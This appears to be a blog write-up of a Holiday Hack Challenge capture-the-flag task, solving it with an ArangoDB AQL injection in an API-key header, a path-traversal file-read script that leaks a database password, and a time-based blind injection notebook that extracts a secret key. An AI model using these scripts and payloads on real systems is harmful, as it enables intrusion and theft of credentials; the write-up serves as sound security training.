+++
title = 'Elf Frostbit Deactivate'
date = 2024-12-14T14:54:27+01:00
draft = true
weight = 4
+++

## Objective

> Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.

## Hints

| From | Hint |
| ---- | ---- |
| Dusty Giftwrap | There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details. |
| Dusty Giftwrap |  The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions. | 

### Note

Had to rededownload the artefacts anew due to the timer on the ransomware note page timed out. References to ids and such might differ from here on from time to time. 

## Solution

### Gold

From other objectives I have already found the deactivation endpoint: 

![Deactivation endpoint](/images/act3/act3-frostbit-decrypt-4.png)

For clarity: 

```
/api/v1/frostbitadmin/bot/<botuuid>/deactivate
```

It appears to requiring "authHeader: X-API-Key" set.

Looking at what HTTP verbs the endpoint support I see: 

![Supported HTTP verbs](/images/act3/act3-frostbit-deactivate-1.png)

* GET
* HEAD
* OPTIONS

The tip mentions that the infratructure may reveal something about itself, let's try the debug trick from earlier objectives: 

![Debug mode](/images/act3/act3-frostbit-deactivate-2.png)

For clarity, here's the output: 

```json
{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
```

This query language looks like ArangoDB, and ChatGPT think that as well. There's a mention of "user_supplied_x_api_key". Let's see if I can trigger something by manipulating it: 

![Debug mode](/images/act3/act3-frostbit-deactivate-3.png)

For clarity, here's the output: 

```json
{"debug":true,"error":"Invalid Key"}
```

Setting header field: 
```
X-Api-Key: 'OR 1 == 1 //
```

Yields this error: 

```json
{"debug":true,"error":"Request Blocked"}
```

### Overview of keywords allowed or blocked 

It appears that certain keywords are blocked, trying to map them out ( according to https://docs.arangodb.com/stable/aql/fundamentals/syntax/ ):

| Keyword               | Description                                                                 |
| --------------------- | --------------------------------------------------------------------------- |
| AGGREGATE             | Performs an aggregation operation over a set of documents.                 |
| ALL                   | Used to check if all elements in a collection or array meet a condition.    |
| ALL_SHORTEST_PATHS    | Computes all shortest paths between two nodes in a graph.                  |
| AND                   | Logical operator used to combine two conditions.                           |
| ANY                   | Returns a single element that satisfies a condition from an array.         |
| ASC                   | Sorts results in ascending order.                                          |
| COLLECT               | Groups results and aggregates them into a single result set.               |
| DESC                  | Sorts results in descending order.                                         |
| DISTINCT              | Removes duplicate results from the query result.                           |
| FALSE                 | Boolean literal representing a false value.                               |
| GRAPH                 | Refers to a graph in ArangoDB, typically used in graph queries.            |
| IN                    | Checks if a value is contained within a set, array, or collection.         |
| INBOUND               | Refers to inbound edges in a graph traversal.                              |
| INTO                  | Used to insert the result of a query into a new or existing collection.    |
| K_PATHS               | Computes the k paths between two nodes in a graph.                         |
| K_SHORTEST_PATHS      | Computes the k shortest paths between two nodes in a graph.                |
| LIKE                  | Performs pattern matching on strings, similar to SQL's LIKE.               |
| LIMIT                 | Restricts the number of results returned by a query.                       |
| NONE                  | Represents an empty set or the negation of a condition.                    |
| NOT                   | Logical negation operator, used to negate a condition.                     |
| NULL                  | Represents a null value.                                                   |
| OR                    | Logical operator used to combine two conditions.                           |
| OUTBOUND              | Refers to outbound edges in a graph traversal.                             |
| REMOVE                | Deletes documents from a collection.                                       |
| REPLACE               | Replaces an existing document in a collection with a new one.              |
| SHORTEST_PATH         | Computes the shortest path between two nodes in a graph.                   |
| SORT                  | Sorts results by one or more fields.                                      |
| TRUE                  | Boolean literal representing a true value.                                |
| UPSERT                | Inserts a document if it doesn't exist, or updates it if it does.          |
| WINDOW                | Used to define a subset of documents, typically for analysis.              |
| SEARCH                | Searches for documents or patterns in collections.                         |

### Digging deeper into the abyss

I know the backend is running ArangDB. On this stage I thought I could be lucky exploiting the LFI from "encryption" challenge to obtain more information. I customized the Python script I used to calculate the LFI URL to take into account user input: 

```python
import requests
import urllib.parse
import re
import base64

botid = "9acf5a6b-52ff-43a5-b06f-1d1232d1cbef"

nonce = bytes([
    0x56,
    0xee,
    0x28,
    0x37,
    0x27,
    0x8f,
    0x66,
    0x34,
    0x56,
    0xee,
    0x28,
    0x37,
    0x27,
    0x8f,
    0x66,
    0x34
])

nonce_string = "%25".join(f"{byte:02x}" for byte in nonce)
separator = urllib.parse.quote_plus(urllib.parse.quote_plus("/"))
payload = f"%25{nonce_string}{separator}"

filepath = input("Path to obtain: ")
filepath_enc = urllib.parse.quote_plus(urllib.parse.quote_plus(filepath))
target_url = f"https://api.frostbit.app/view/{payload}..%252F..%252F..%252F..%252F..{filepath_enc}/{botid}/status?debug=1&digest=00000000000000000000000000000000"
res = requests.get(target_url)

print("Url with payload")
print(target_url)

# Regex pattern to extract the value of debugData
pattern = r'const debugData = "(.*?)";'

# Search for the debugData value
match = re.search(pattern, res.text)
print(f"\nFile content {filepath}:\n")
print(base64.b64decode(match.group(1)).decode('utf-8'))
```

Interested in finding out what's on the path I looked into ```/proc/self/environ``` using this script. This was the output: 

```
└─$ python test.py
Path to obtain: /proc/self/environ
Url with payload
https://api.frostbit.app/view/%2556%25ee%2528%2537%2527%258f%2566%2534%2556%25ee%2528%2537%2527%258f%2566%2534%252F..%252F..%252F..%252F..%252F..%252Fproc%252Fself%252Fenviron/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/status?debug=1&digest=00000000000000000000000000000000

File content /proc/self/environ:

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=6059e5d8ecc8FROSTBIT_CHALLENGE_HASH=6487b8b081bc4317cc8017a898c7dfc8LETSENCRYPT_EMAIL=ops@counterhack.comPYTHONUNBUFFERED=1VIRTUAL_PORT=8080ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodbAPP_DEBUG=trueAPI_ENDPOINT=https://2024.holidayhackchallenge.comVIRTUAL_HOST=api.frostbit.appLETSENCRYPT_HOST=api.frostbit.appLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION=3.9.19PYTHON_PIP_VERSION=23.0.1PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/def4aec84b261b939137dd1c69eff0aabb4a7bf4/public/get-pip.pyPYTHON_GET_PIP_SHA256=bc37786ec99618416cc0a0ca32833da447f4d91ab51d2c138dd15b7af21e8e9aHOME=/root
```

We now know the password for this database server:

```
ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodb
```






Solution, created a Jupyter Notebook to work in. 








#### Jupyter Notebook

##### Part one - identifying letters used in fieldnames in ArangoDB documents

```python
import requests
import string

characters = list(string.ascii_lowercase)
characters.append("_")
characters.append("|")

def identify_letters(needle):
    res = requests.get(
        "https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1",
        headers={
            "X-Api-Key": f"' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0"
        }
    )

    return res.elapsed.total_seconds()

found_letters = []

for c in characters:
    time_taken = identify_letters(f"{c}")
    
    if time_taken < 2: 
        found_letters.append(c)

found_letters
```

Outputs: 

```json
['a', 'c', 'd', 'e', 'i', 'k', 'p', 'r', 't', 'v', 'y', '_', '|']
```

##### Part two - identify fieldnames

Having the characters used in the fieldnames, I could simply bruteforce my way to find which names was in use: 

```python
def identify_keys(needle):
    payload = f"' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0"
    res = requests.get(
        "https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1",
        headers={
            "X-Api-Key": payload
        }
    )

    print(payload)

    return res.elapsed.total_seconds()

def iterate_keys(needle, characters):
    for c in characters:
        tmp_needle = f"{needle}{c}"
        time_taken = identify_keys(tmp_needle)
        if time_taken < 2:
            print(tmp_needle)
            iterate_keys(tmp_needle, characters)

    return needle

def iterate_keys_reverse(needle, characters):
    for c in characters:
        tmp_needle = f"{c}{needle}"
        time_taken = identify_keys(tmp_needle)
        if time_taken < 2:
            print(tmp_needle)
            iterate_keys(tmp_needle, characters)

    return needle

# print(iterate_keys("", found_letters)) # ==> Returns "activate_api_key|_rev|_key|_id"
print(iterate_keys_reverse("activate_api_key|_rev|_key|_id", found_letters)) # ==> Returns "deactivate_api_key|_rev|_key|_id"
```

I had to run this cell two times, one for forward direction identification - and one for iterating my way backwards. Sure, I could have written a cleaner code. Output:

```json
...
' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), 'ydeactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0
' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '_deactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0
' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '|deactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0
deactivate_api_key|_rev|_key|_id
```

##### Part three - finding the API key

The fieldname we are looking for is ```deactivate_api_key```. Using this, I could start finding the API key: 

```python
def identify_apichar(needle):
    payload = f"' OR CONTAINS(doc.deactivate_api_key, '{needle}') OR sleep(5) OR '1'=='0"
    res = requests.get(
        "https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1",
        headers={
            "X-Api-Key": payload
        }
    )

    print(payload)

    return res.elapsed.total_seconds()

def find_api(needle, characters):
    for c in characters:
        tmp_needle = f"{needle}{c}"
        time_taken = identify_apichar(tmp_needle)
        if time_taken < 2:
            print(tmp_needle)
            find_api(tmp_needle, characters)

    return needle

characters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
characters.append("_")
characters.append("|")
characters.append("-")
find_api("", characters)
```

Output (this took a way looooong time to do):

```json
...
' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f9Z') OR sleep(5) OR '1'=='0
' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f90') OR sleep(5) OR '1'=='0
' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f91') OR sleep(5) OR '1'=='0
abe7a6ad-715e-4e6a-901b-c9279a964f91
```

Answer: ```abe7a6ad-715e-4e6a-901b-c9279a964f91```

##### Part four - deactivate

With the API key found, I simply submitted it using my BOTID (15d977db-9fa9-48f8-be38-d36c2e21b12d) using Burp Suite:

```HTTP
GET /api/v1/frostbitadmin/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
X-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91
Content-Length: 0
```

Response:

```
HTTP/2 200 OK
Server: nginx/1.27.1
Date: Wed, 25 Dec 2024 19:43:01 GMT
Content-Type: application/json
Content-Length: 314
Strict-Transport-Security: max-age=31536000

{"message":"Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"15d977db-9fa9-48f8-be38-d36c2e21b12d\",\"hash\":\"f215785933f3a1ee0245a653781b94c1bc33c0340301355592492d9b8a2e9b30\",\"uid\":\"82237\"}\nPOSTED WIN RESULTS FOR RID 15d977db-9fa9-48f8-be38-d36c2e21b12d","status":"Deactivated"}
```

The API key to deactivate is: ```abe7a6ad-715e-4e6a-901b-c9279a964f91```